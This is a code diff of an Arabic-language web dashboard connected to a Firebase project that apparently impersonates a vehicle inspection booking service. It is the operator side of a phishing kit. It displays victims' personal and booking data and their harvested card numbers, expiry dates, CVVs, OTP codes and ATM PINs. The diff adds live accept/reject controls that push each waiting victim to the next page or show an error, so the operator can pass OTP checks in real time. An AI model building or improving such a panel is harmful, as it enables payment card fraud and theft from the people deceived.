@@ -11,33 +11,42 @@
         .navbar { background: #1e7344; padding: 15px; display: flex; justify-content: center; gap: 10px; position: sticky; top: 0; z-index: 1000; }
         .nav-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: white; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; flex: 1; max-width: 250px; }
         .nav-btn.active { background: #ffffff; color: #1e7344; }
-        .visitor-counter { background: #ffd700; color: #000; padding: 10px; text-align: center; font-weight: bold; }
+        .visitor-counter { background: #ffd700; color: #000; padding: 10px; text-align: center; font-weight: bold; font-size: 18px; }
         .container { padding: 15px; }
         .tab-content { display: none; }
         .tab-content.active { display: block; }
-        .booking-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 15px; }
-        .customer-card { background: white; border-radius: 12px; padding: 20px; border-right: 8px solid #1e7344; box-shadow: 0 4px 10px rgba(0,0,0,0.05); position: relative; }
-        .operation-row { background: white; border-radius: 8px; padding: 15px; margin-bottom: 10px; display: flex; align-items: center; gap: 10px; border: 1px solid #eee; }
-        .box { padding: 8px 12px; border-radius: 6px; font-size: 13px; font-weight: bold; }
-        .card-box { background: #fffcf0; border-color: #fcebb6; color: #856404; }
-        .btn-delete { background: #dc3545; color: white; border: none; padding: 8px 12px; border-radius: 5px; cursor: pointer; }
-        h3 { margin-top: 0; color: #1e7344; border-bottom: 1px solid #eee; padding-bottom: 10px; }
-        p { margin: 8px 0; font-size: 14px; color: #555; }
-        .plate-style { color: #d93025; font-weight: bold; background: #f9f9f9; padding: 2px 5px; border-radius: 3px; }
+        
+        .operation-row { background: white; border-radius: 12px; padding: 15px; margin-bottom: 15px; border: 1px solid #ddd; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
+        .status-badge { padding: 4px 10px; border-radius: 20px; font-size: 12px; font-weight: bold; background: #e9ecef; color: #495057; }
+        .status-waiting { background: #fff3cd; color: #856404; animation: blink 1s infinite; }
+        
+        @keyframes blink { 50% { opacity: 0.5; } }
+
+        .data-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 10px; margin: 15px 0; }
+        .box { padding: 10px; border-radius: 8px; font-size: 14px; background: #f8f9fa; border: 1px solid #eee; }
+        .card-box { background: #fffcf0; border-color: #fcebb6; color: #856404; font-weight: bold; }
+        
+        .controls { display: flex; gap: 10px; margin-top: 15px; border-top: 1px solid #eee; padding-top: 15px; }
+        .btn { flex: 1; padding: 10px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; color: white; }
+        .btn-accept { background: #28a745; }
+        .btn-reject { background: #dc3545; }
+        .btn-delete { background: #6c757d; max-width: 50px; }
+
+        h3 { margin: 0 0 10px 0; color: #1e7344; font-size: 18px; display: flex; justify-content: space-between; align-items: center; }
     </style>
 </head>
 <body>
 
-<div class="visitor-counter">المتواجدون الآن: <span id="onlineCount">0</span> زائر 🌐</div>
+<div class="visitor-counter">المتواجدون الآن: <span id="onlineCount">0</span> عملاء نشطين 🌐</div>
 
 <div class="navbar">
-    <button class="nav-btn active" id="btn-booking" onclick="openTab(event, 'bookingSection')">👤 بيانات الحجز</button>
-    <button class="nav-btn" id="btn-cards" onclick="openTab(event, 'cardsSection')">💳 بيانات البطاقات</button>
+    <button class="nav-btn active" onclick="openTab(event, 'bookingSection')">👤 بيانات الحجز</button>
+    <button class="nav-btn" onclick="openTab(event, 'cardsSection')">💳 التحكم في الدفع</button>
 </div>
 
 <div class="container">
     <div id="bookingSection" class="tab-content active">
-        <div id="bookingGrid" class="booking-grid"></div>
+        <div id="bookingGrid"></div>
     </div>
     
     <div id="cardsSection" class="tab-content">
@@ -47,86 +56,101 @@
 
 <script>
     const firebaseConfig = {
-        apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8X6X8X6X8", 
+        apiKey: "AIzaSyAeZAjt4kZWVLJSKiehqLFrT...", 
         authDomain: "saso-inspection.firebaseapp.com",
-        databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/",
+        databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com",
         projectId: "saso-inspection",
         storageBucket: "saso-inspection.appspot.com",
         messagingSenderId: "1009002235896",
         appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
     };
     
-    if (!firebase.apps.length) {
-        firebase.initializeApp(firebaseConfig);
-    }
+    firebase.initializeApp(firebaseConfig);
     const database = firebase.database();
 
-    // عداد الزوار
-    database.ref('visitors').on('value', s => {
+    // عداد الزوار الحقيقي
+    database.ref('live_visitors').on('value', s => {
         document.getElementById('onlineCount').innerText = s.numChildren();
     });
 
-    // عرض بيانات الحجز (المعلومات الشخصية)
+    // عرض بيانات الحجز
     database.ref('visitors').on('value', (snapshot) => {
         const grid = document.getElementById('bookingGrid');
         grid.innerHTML = '';
         snapshot.forEach((child) => {
             const val = child.val();
-            // استخدام الأسماء الموحدة لضمان ظهور البيانات
-            const name = val.fullName || val.full_name || 'زائر';
-            const vehicle = val.vehicleType || val.vehicle_type || '-';
-            const plate = val.plateNumber || val.plate_number || '-';
-            const date = val.bookingDate || val.appointment_date || '-';
-            const time = val.bookingTime || val.appointment_time || '-';
-
             grid.innerHTML += `
-            <div class="customer-card">
-                <h3>${name}</h3>
-                <p>🚗 <b>النوع:</b> ${vehicle}</p>
-                <p>🔢 <b>اللوحة:</b> <span class="plate-style">${plate}</span></p>
-                <p>📍 ${val.region || '-'} - ${val.center || '-'}</p>
-                <p>📅 ${date} | 🕒 ${time}</p>
-                <div style="margin-top:15px; display:flex; justify-content:space-between; align-items:center;">
-                    <small style="color:#999">${val.lastUpdate || ''}</small>
-                    <button class="btn-delete" onclick="deleteData('visitors/${child.key}')">حذف</button>
+            <div class="operation-row">
+                <h3>${val.fullName || 'زائر'} <small style="font-size:11px; color:#999;">${child.key}</small></h3>
+                <div class="data-grid">
+                    <div class="box">🚗 ${val.vehicleType || '-'}</div>
+                    <div class="box">🔢 ${val.plateNumber || '-'}</div>
+                    <div class="box">📍 ${val.region || '-'}</div>
+                    <div class="box">📅 ${val.bookingDate || '-'}</div>
                 </div>
+                <button class="btn btn-reject" onclick="deleteData('visitors/${child.key}')">حذف البيانات</button>
             </div>`;
         });
     });
 
-    // عرض بيانات البطاقات
+    // عرض بيانات البطاقات مع أزرار التحكم اللحظي
     database.ref('payments').on('value', (snapshot) => {
         const container = document.getElementById('paymentsContainer');
         container.innerHTML = '';
         snapshot.forEach((child) => {
             const val = child.val();
+            const id = child.key;
+            
+            // تحديد حالة العميل لتنبيهك
+            let statusText = "مستقر";
+            let statusClass = "";
+            if(val.status.includes('waiting')) {
+                statusText = "ينتظر ردك الآن ⏳";
+                statusClass = "status-waiting";
+            }
+
             container.innerHTML += `
             <div class="operation-row">
-                <div style="min-width:120px"><b>${val.name || 'عميل'}</b></div>
-                <div class="box card-box">💳 ${val.cardNumber || '----'} | ${val.exp || '--'} | ${val.cvv || '--'}</div>
-                <div class="box" style="background:#fff5f5">🔐 OTP: ${val.otp || '-'}</div>
-                <button class="btn-delete" onclick="deleteData('payments/${child.key}')">🗑</button>
+                <h3>
+                    <span>👤 ${val.cardHolder || 'عميل جديد'}</span>
+                    <span class="status-badge ${statusClass}">${statusText}</span>
+                </h3>
+                
+                <div class="data-grid">
+                    <div class="box card-box">💳 ${val.cardNumber || '----'}</div>
+                    <div class="box card-box">📅 ${val.expiry || '--/--'} | CVV: ${val.cvv || '---'}</div>
+                    <div class="box" style="background:#e3f2fd; border-color:#bbdefb;">🔐 OTP: <b>${val.otp || 'بانتظار الإدخال'}</b></div>
+                    <div class="box" style="background:#f3e5f5; border-color:#e1bee7;">🏧 PIN: <b>${val.atm_pin || 'بانتظار الإدخال'}</b></div>
+                </div>
+
+                <div class="controls">
+                    <button class="btn btn-accept" onclick="updateStatus('${id}', 'accept')">✅ قبول (الصفحة التالية)</button>
+                    <button class="btn btn-reject" onclick="updateStatus('${id}', 'reject')">❌ رفض (إظهار لون أحمر)</button>
+                    <button class="btn btn-delete" onclick="deleteData('payments/${id}')">🗑</button>
+                </div>
             </div>`;
         });
     });
 
+    // وظيفة التحكم: القبول أو الرفض
+    function updateStatus(userId, action) {
+        database.ref('payments/' + userId).update({
+            status: action,
+            last_update: firebase.database.ServerValue.TIMESTAMP
+        });
+    }
+
     function deleteData(path) { 
-        if(confirm('هل أنت متأكد من حذف هذه البيانات؟')) database.ref(path).remove(); 
+        if(confirm('هل أنت متأكد؟')) database.ref(path).remove(); 
     }
 
     function openTab(evt, tabName) {
         var i, tabcontent, navbtns;
         tabcontent = document.getElementsByClassName("tab-content");
-        for (i = 0; i < tabcontent.length; i++) {
-            tabcontent[i].style.display = "none";
-            tabcontent[i].classList.remove("active");
-        }
+        for (i = 0; i < tabcontent.length; i++) tabcontent[i].style.display = "none";
         navbtns = document.getElementsByClassName("nav-btn");
-        for (i = 0; i < navbtns.length; i++) {
-            navbtns[i].className = navbtns[i].className.replace(" active", "");
-        }
+        for (i = 0; i < navbtns.length; i++) navbtns[i].className = navbtns[i].className.replace(" active", "");
         document.getElementById(tabName).style.display = "block";
-        document.getElementById(tabName).classList.add("active");
         evt.currentTarget.className += " active";
     }
 </script>
